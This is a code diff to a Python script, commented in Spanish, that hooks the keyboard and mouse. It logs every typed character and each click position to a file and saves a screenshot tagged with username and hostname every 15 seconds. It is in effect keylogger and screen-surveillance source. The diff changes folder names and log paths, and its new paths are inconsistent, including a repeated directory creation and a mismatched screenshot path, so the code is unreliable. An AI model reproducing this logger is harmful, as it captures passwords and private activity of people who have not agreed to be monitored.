@@ -24,27 +24,34 @@ window.geometry("600x500")
 
 
 # nombre de fichero log + DDMMAAHHMMSS.txt
-logname= 'log'+ pyautogui.datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S") + '.txt'
-print(logname)
+
 
 #crea una carpeta capturasdepantalla en la carpeta del usuario
 def createFolder():
     try:
-        os.mkdir('C:\\users\\%s\\capturasdepantalla' % os.getlogin())
+        os.mkdir('C:\\users\\%s\\screenShots' % os.getlogin())
     except OSError:
-        print ("Creation of the directory %s failed" % 'C:\\users\\%s\\capturasdepantalla' % os.getlogin())
+        print ("Creation of the directory %s failed" % 'C:\\users\\%s\\screenShots' % os.getlogin())
     else:
-        print ("Successfully created the directory %s " % 'C:\\users\\%s\\capturasdepantalla' % os.getlogin())
+        print ("Successfully created the directory %s " % 'C:\\users\\%s\\screenShots' % os.getlogin())
 
 
 
 createFolder()
 
+# Generar nombre para archivo log
+log_filename = 'log_'+ pyautogui.datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S") + '.txt' 
 
-#file_log = 'C:\\users\\%s\\logname.txt' % os.getlogin()
+# Crear carpeta para screenshots
+screenshots_dir = 'C:\\users\\%s\\screenshots' % os.getlogin()
+os.mkdir(screenshots_dir)
+
+# Ruta completa a archivo log
+log_file = os.path.join(screenshots_dir, log_filename)
+
 def OnKeyboardEvent(event):
     
-    logging.basicConfig(filename=f'{logname}', level=logging.DEBUG, format='%(message)s')
+    logging.basicConfig(filename=f'{log_file}', level=logging.DEBUG, format='%(message)s')
     chr(event.Ascii)
     logging.log(10,chr(event.Ascii))
     return True
@@ -53,7 +60,7 @@ def OnKeyboardEvent(event):
 def OnMouseEvent(event):
     #print('Click en ({}, {})'.format(event.Position[0], event.Position[1]))
     current_time = datetime.datetime.now()
-    logging.basicConfig(filename=f'{logname}', level=logging.DEBUG, format='%(message)s')
+    logging.basicConfig(filename=f'{log_file}', level=logging.DEBUG, format='%(message)s')
     log_message = f"Click en ({event.Position[0]}, {event.Position[1]}) en {current_time}"
     logging.log(10,log_message)
     
@@ -76,7 +83,7 @@ def screenshotdateAndTime():
     print("La captura de pantalla ha iniciado")
     while True:
         screenshot = pyautogui.screenshot()
-        screenshot.save('C:\\users\\%s\\%s_%s.png' % (os.getlogin(), socket.gethostname(), datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")))
+        screenshot.save('C:\\users\\screenShots\\%s\\%s_%s.png' % (os.getlogin(), socket.gethostname(), datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")))
         i += 1
         time.sleep(15)
 
